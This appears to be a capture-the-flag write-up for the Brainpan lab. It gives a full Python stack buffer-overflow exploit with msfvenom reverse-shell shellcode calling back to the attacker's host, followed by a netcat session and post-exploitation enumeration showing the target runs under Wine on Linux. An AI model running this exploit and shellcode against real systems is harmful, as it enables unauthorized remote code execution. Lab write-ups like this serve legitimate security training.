
```python
#!/usr/bin/env python3
#2025-01-22

import socket

ip = "10.10.213.158"
port = 9999

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\x0a"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
usechars = bytes(usechars, "latin-1")
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# msfvenom --payload 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 --format 'python' --bad-chars '\x00\x0a'
buf =  b""
buf += b"\xd9\xec\xd9\x74\x24\xf4\xb8\xac\xf9\x09\xed\x5b"
buf += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\xef"
buf += b"\xea\xeb\x18\x13\xe4\x6e\xe2\xeb\xf5\x0e\x6a\x0e"
buf += b"\xc4\x0e\x08\x5b\x77\xbf\x5a\x09\x74\x34\x0e\xb9"
buf += b"\x0f\x38\x87\xce\xb8\xf7\xf1\xe1\x39\xab\xc2\x60"
buf += b"\xba\xb6\x16\x42\x83\x78\x6b\x83\xc4\x65\x86\xd1"
buf += b"\x9d\xe2\x35\xc5\xaa\xbf\x85\x6e\xe0\x2e\x8e\x93"
buf += b"\xb1\x51\xbf\x02\xc9\x0b\x1f\xa5\x1e\x20\x16\xbd"
buf += b"\x43\x0d\xe0\x36\xb7\xf9\xf3\x9e\x89\x02\x5f\xdf"
buf += b"\x25\xf1\xa1\x18\x81\xea\xd7\x50\xf1\x97\xef\xa7"
buf += b"\x8b\x43\x65\x33\x2b\x07\xdd\x9f\xcd\xc4\xb8\x54"
buf += b"\xc1\xa1\xcf\x32\xc6\x34\x03\x49\xf2\xbd\xa2\x9d"
buf += b"\x72\x85\x80\x39\xde\x5d\xa8\x18\xba\x30\xd5\x7a"
buf += b"\x65\xec\x73\xf1\x88\xf9\x09\x58\xc5\xce\x23\x62"
buf += b"\x15\x59\x33\x11\x27\xc6\xef\xbd\x0b\x8f\x29\x3a"
buf += b"\x6b\xba\x8e\xd4\x92\x45\xef\xfd\x50\x11\xbf\x95"
buf += b"\x71\x1a\x54\x65\x7d\xcf\xfb\x35\xd1\xa0\xbb\xe5"
buf += b"\x91\x10\x54\xef\x1d\x4e\x44\x10\xf4\xe7\xef\xeb"
buf += b"\x9f\x0d\xe5\xec\x30\x7a\x07\x12\xce\xc1\x8e\xf4"
buf += b"\xba\x25\xc7\xaf\x52\xdf\x42\x3b\xc2\x20\x59\x46"
buf += b"\xc4\xab\x6e\xb7\x8b\x5b\x1a\xab\x7c\xac\x51\x91"
buf += b"\x2b\xb3\x4f\xbd\xb0\x26\x14\x3d\xbe\x5a\x83\x6a"
buf += b"\x97\xad\xda\xfe\x05\x97\x74\x1c\xd4\x41\xbe\xa4"
buf += b"\x03\xb2\x41\x25\xc1\x8e\x65\x35\x1f\x0e\x22\x61"
buf += b"\xcf\x59\xfc\xdf\xa9\x33\x4e\x89\x63\xef\x18\x5d"
buf += b"\xf5\xc3\x9a\x1b\xfa\x09\x6d\xc3\x4b\xe4\x28\xfc"
buf += b"\x64\x60\xbd\x85\x98\x10\x42\x5c\x19\x20\x09\xfc"
buf += b"\x08\xa9\xd4\x95\x08\xb4\xe6\x40\x4e\xc1\x64\x60"
buf += b"\x2f\x36\x74\x01\x2a\x72\x32\xfa\x46\xeb\xd7\xfc"
buf += b"\xf5\x0c\xf2"

offset = 524
overflow = b"A" * offset
retn = b"\xf3\x12\x17\x31" #311712f3 - pos of JMP ESP
padding = b"\x90" * 16  #space to expand in

#payload = usechars
payload = buf

buffer = overflow + retn + padding + payload + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))

  print("Sending payload...")
  s.send(buffer + b"\r\n") #add \r\n if can't recv data
  print("Done!")
  
except:
  print("Exception: "+str(e))
```

```sh
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 443                                                                                                   
listening on [any] 443 ...
connect to [10.21.31.111] from (UNKNOWN) [10.10.52.89] 42821
CMD Version 1.4.1

Z:\home\puck>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\puck

  3/6/2013   2:23 PM  <DIR>         .
  3/4/2013  10:49 AM  <DIR>         ..
  3/6/2013   2:23 PM           513  checksrv.sh
  3/4/2013   1:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,850,247,168 bytes free


Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 

Z:\home\puck>/bin/bash

Z:\home\puck>ls
File not found.
```

Is this windows??? Brainpan.exe is kept running by a bash script!
If we read more carefully we can see:
`/usr/bin/wine /home/puck/web/bin/brainpan.exe &`

I checked the user temp, windows temp, and both were empty. Also the windows dir and really everything felt very wrong. There was a c: but:
```sh
C:\>dir
Volume in drive C has no label.
Volume Serial Number is 0000-0000

Directory of C:\

  3/4/2013  12:13 PM  <DIR>         Program Files
  3/4/2013  12:13 PM  <DIR>         users
  3/4/2013  12:13 PM  <DIR>         windows
       0 files                        0 bytes
       3 directories     13,850,247,168 bytes free
```

```sh
Z:\>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

  3/4/2013  12:02 PM  <DIR>         bin
  3/4/2013  10:19 AM  <DIR>         boot
 1/22/2025   9:54 AM  <DIR>         etc
  3/4/2013  10:49 AM  <DIR>         home
  3/4/2013  10:18 AM    15,084,717  initrd.img
  3/4/2013  10:18 AM    15,084,717  initrd.img.old
  3/4/2013  12:04 PM  <DIR>         lib
  3/4/2013   9:12 AM  <DIR>         lost+found
  3/4/2013   9:12 AM  <DIR>         media
 10/9/2012   8:59 AM  <DIR>         mnt
  3/4/2013   9:13 AM  <DIR>         opt
  3/7/2013  10:07 PM  <DIR>         root
 1/22/2025   9:54 AM  <DIR>         run
  3/4/2013  10:20 AM  <DIR>         sbin
 6/11/2012   8:43 AM  <DIR>         selinux
  3/4/2013   9:13 AM  <DIR>         srv
 1/22/2025  10:22 AM  <DIR>         tmp
  3/4/2013   9:13 AM  <DIR>         usr
  8/5/2019   2:47 PM  <DIR>         var
 2/25/2013   1:32 PM     5,180,432  vmlinuz
 2/25/2013   1:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,850,247,168 bytes free
```

```sh
Z:\>whoami
File not found.


Z:\>ver

CMD Version 1.4.1

C:\windows>set
_=/usr/bin/wine
ALLUSERSPROFILE=C:\users\Public
APPDATA=C:\users\puck\Application Data
CLIENTNAME=Console
CommonProgramFiles=C:\Program Files\Common Files
ComSpec=C:\windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\users\puck
LANG=en_US.UTF-8
LOCALAPPDATA=C:\users\puck\Local Settings\Application Data
LOGNAME=puck
LOGONSERVER=\\brainpan
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
PATH=C:\windows\system32;C:\windows;C:\windows\system32\wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_IDENTIFIER=x86 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramFiles=C:\Program Files
PROMPT=$P$G
SESSIONNAME=Console
SHELL=/bin/sh
SHLVL=1
SystemDrive=c:
SYSTEMROOT=C:\windows
TEMP=C:\users\puck\Temp
TMP=C:\users\puck\Temp
USERDOMAIN=brainpan
USERNAME=puck
USERPROFILE=C:\users\puck
windir=C:\windows
WINELOADERNOEXEC=1
winsysdir=C:\windows\system32
```

oh, wine!

```sh
C:\windows>systeminfo
File not found.


C:\windows>netstat
File not found.


C:\windows>/usr/bin/wine

C:\windows>Usage: wine PROGRAM [ARGUMENTS...]   Run the specified program
       wine --help                   Display this help and exit
       wine --version                Output version information and exit
```

```sh
Z:\>/bin/bash

Z:\>c:

Z:\>c:

Z:\>dir
File not found.


Z:\>wefgawger
/bin/bash: line 1: ccdwefgawger: command not found
asdf
File not found.


Z:\>ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old


Z:\>ver
/bin/bash: line 3: ver: command not found
exit

dir
bin   etc         initrd.img.old  media  proc  sbin     sys  var
boot  home        lib             mnt    root  selinux  tmp  vmlinuz
dev   initrd.img  lost+found      opt    run   srv      usr  vmlinuz.old
ls
bin
boot
dev
...
```

So sometimes ls is there and sometimes we get the not found, funny

```
Z:\home\puck>ps aux
File not found.

Z:\home\puck>/bin/ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3500  1864 ?        Ss   10:46   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    10:46   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    10:46   0:00 [ksoftirqd/0]
root         6  0.0  0.0      0     0 ?        S    10:46   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    10:46   0:00 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S<   10:46   0:00 [cpuset]
root         9  0.0  0.0      0     0 ?        S<   10:46   0:00 [khelper]
root        10  0.0  0.0      0     0 ?        S    10:46   0:00 [kdevtmpfs]
root        11  0.0  0.0      0     0 ?        S<   10:46   0:00 [netns]
root        12  0.0  0.0      0     0 ?        S    10:46   0:00 [xenwatch]
root        13  0.0  0.0      0     0 ?        S    10:46   0:00 [xenbus]
root        14  0.0  0.0      0     0 ?        S    10:46   0:00 [sync_supers]
root        15  0.0  0.0      0     0 ?        S    10:46   0:00 [bdi-default]
root        16  0.0  0.0      0     0 ?        S<   10:46   0:00 [kintegrityd]
root        17  0.0  0.0      0     0 ?        S<   10:46   0:00 [kblockd]
root        18  0.0  0.0      0     0 ?        S<   10:46   0:00 [ata_sff]
root        19  0.0  0.0      0     0 ?        S    10:46   0:00 [khubd]
root        20  0.0  0.0      0     0 ?        S<   10:46   0:00 [md]
root        21  0.0  0.0      0     0 ?        S    10:46   0:00 [kworker/0:1]
root        24  0.0  0.0      0     0 ?        S    10:46   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    10:46   0:00 [kswapd0]
root        26  0.0  0.0      0     0 ?        SN   10:46   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        SN   10:46   0:00 [khugepaged]
root        28  0.0  0.0      0     0 ?        S    10:46   0:00 [fsnotify_mark]
root        29  0.0  0.0      0     0 ?        S    10:46   0:00 [ecryptfs-kthrea]
root        30  0.0  0.0      0     0 ?        S<   10:46   0:00 [crypto]
root        39  0.0  0.0      0     0 ?        S<   10:46   0:00 [kthrotld]
root        40  0.0  0.0      0     0 ?        S    10:46   0:00 [kworker/u:2]
root        41  0.0  0.0      0     0 ?        S    10:46   0:00 [scsi_eh_0]
root        42  0.0  0.0      0     0 ?        S    10:46   0:00 [scsi_eh_1]
root        43  0.0  0.0      0     0 ?        S    10:46   0:00 [kworker/u:3]
root        45  0.0  0.0      0     0 ?        S<   10:46   0:00 [binder]
root        64  0.0  0.0      0     0 ?        S<   10:46   0:00 [deferwq]
root        65  0.0  0.0      0     0 ?        S<   10:46   0:00 [charger_manager]
root        66  0.0  0.0      0     0 ?        S<   10:46   0:00 [devfreq_wq]
root       206  0.0  0.0      0     0 ?        S    10:46   0:00 [jbd2/xvda1-8]
root       207  0.0  0.0      0     0 ?        S<   10:46   0:00 [ext4-dio-unwrit]
root       315  0.0  0.0   2820   872 ?        S    10:46   0:00 upstart-udev-bridge --daemon
root       324  0.0  0.0   3160  1408 ?        Ss   10:46   0:00 /sbin/udevd --daemon
102        439  0.0  0.0   3248  1028 ?        Ss   10:46   0:00 dbus-daemon --system --fork
syslog     444  0.0  0.0  30048  1360 ?        Sl   10:46   0:00 rsyslogd -c5
root       515  0.0  0.0   3064   936 ?        S    10:46   0:00 /sbin/udevd --daemon
root       516  0.0  0.0   3144  1012 ?        S    10:46   0:00 /sbin/udevd --daemon
root       576  0.0  0.0      0     0 ?        S<   10:46   0:00 [kpsmoused]
root       579  0.0  0.0      0     0 ?        S    10:46   0:00 [kworker/0:2]
root       656  0.0  0.0   2816   600 ?        S    10:46   0:00 upstart-socket-bridge --daemon
root       699  0.0  0.0   5492  1856 ?        Ss   10:46   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       721  0.0  0.1  18832  3588 ?        Ss   10:46   0:00 /usr/sbin/winbindd -F
root       794  0.0  0.0   4632   852 tty4     Ss+  10:46   0:00 /sbin/getty -8 38400 tty4
root       797  0.0  0.0   4632   848 tty5     Ss+  10:46   0:00 /sbin/getty -8 38400 tty5
root       804  0.0  0.0   4632   844 tty2     Ss+  10:46   0:00 /sbin/getty -8 38400 tty2
root       805  0.0  0.0   4632   856 tty3     Ss+  10:46   0:00 /sbin/getty -8 38400 tty3
root       807  0.0  0.0   4632   848 tty6     Ss+  10:46   0:00 /sbin/getty -8 38400 tty6
daemon     817  0.0  0.0   2476   124 ?        Ss   10:46   0:00 atd
root       818  0.0  0.0   2620   800 ?        Ss   10:46   0:00 cron
root       872  0.0  0.0   4632   852 tty1     Ss+  10:46   0:00 /sbin/getty -8 38400 tty1
root       880  0.0  0.0  18832  1300 ?        S    10:46   0:00 /usr/sbin/winbindd -F
root       881  0.0  0.0      0     0 ?        S    10:46   0:00 [flush-202:0]
root       887  0.0  0.0   3180  1144 ?        S    10:47   0:00 CRON
puck       888  0.0  0.0   2232   544 ?        Ss   10:47   0:00 /bin/sh -c /home/puck/checksrv.sh
puck       889  0.0  0.0   5176  1288 ?        S    10:47   0:00 /bin/bash /home/puck/checksrv.sh
puck       901  0.0  0.2  12396  6060 ?        S    10:47   0:00 /usr/bin/python -m SimpleHTTPServer 10000
puck       988  0.0  0.1 1595444 2508 ?        S    10:56   0:00 /home/puck/web/bin/brainpan.exe                                      
puck       992  0.4  0.1   6272  3200 ?        Rs   10:56   0:00 /usr/bin/wineserver
puck       998  0.0  0.1 1597932 2784 ?        Sl   10:56   0:00 C:\windows\system32\services.exe                                      
puck      1002  0.0  0.1 1598372 2688 ?        Sl   10:56   0:00 C:\windows\system32\winedevice.exe MountMgr                                      
puck      1012  0.0  0.1 1596660 2380 ?        Sl   10:56   0:00 C:\windows\system32\plugplay.exe                                      
puck      1020  0.0  0.2 1605852 4852 ?        S    10:56   0:00 cmd                                      
puck      1022  0.0  0.0   5204  1196 ?        R    10:56   0:00 /bin/ps aux
```

As /bin/bash worked and I could run /bin/ps I think a linux rev shell might work just fine...
